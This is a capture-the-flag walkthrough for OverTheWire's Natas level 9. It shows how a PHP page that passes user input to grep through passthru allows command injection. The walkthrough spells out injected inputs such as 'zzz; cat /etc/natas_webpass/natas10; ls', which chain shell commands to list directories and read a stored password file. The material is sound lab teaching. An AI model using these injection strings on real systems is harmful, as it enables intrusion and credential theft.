## Natas Level 9

- URL: http://natas9.natas.labs.overthewire.org

- Open the website

- Analyze the php code in the source code
![SourceCode](images/level_09_02.png)

- We can add our own code to the passthru function 
- `passthru("grep -i $key dictionary.txt");`

- Show the directory we are currently on by setting searching for
- ` `

![PWD](images/level_09_03.png)

- Explanation
    - The reulting query from the above seach string is
    - `grep -i zzz; pwd; ls dictionary.txt`
    - We are using the semicolon to separate different commands
    - We are using `zzz` to make sure grep returns no result
    - `pwd` to print the current working directory
    - `ls` to list the dictionary.txt so that we don't have the word dictionary.txt hanging on its own at the end of the command which could cause the command to fail

- Use the find command to find any file related to natas10 `zzz; find / -type f -name natas10 2>/dev/null; ls`
    > Output: <br>
    > /etc/natas_webpass/natas10
    > dictionary.txt <br>


- Search for `zzz; cat /etc/natas_webpass/natas10; ls` to print the contents of .httpasswd
    > Output: <br>
    > [natas_10_password] <br> 
    > dictionary.txt <br>

<br>
<br>
- PS: Just using the semicolon and the command can also works in some situations

    > `; cat /etc/natas_webpass/natas10`
    > 
    > Output: <br>
    > [natas_10_password] <br>
    > 
    > African <br>
    > Africans  <br>
    > Allah  <br>
    > .....
